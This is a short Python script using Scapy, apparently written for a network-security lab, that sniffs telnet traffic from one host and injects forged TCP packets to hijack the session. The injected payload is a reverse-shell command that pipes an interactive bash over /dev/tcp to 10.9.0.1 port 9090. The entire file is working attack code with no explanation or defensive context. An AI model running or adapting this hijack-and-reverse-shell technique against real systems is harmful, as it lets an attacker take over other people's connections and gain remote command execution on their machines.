#!/usr/bin/env python3

from scapy.all import *
import subprocess


def hijack_tcp(pkt):
	if pkt[TCP].flags == "A":
		ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
		tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="PA", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
		# data = "\r\necho \"hello world!\"\r\n"
		data = "\n/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
		send(ip/tcp/data)


cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()

pkt = sniff(iface=IFACE, filter="src host 10.9.0.5 and tcp dst port telnet", prn=hijack_tcp)

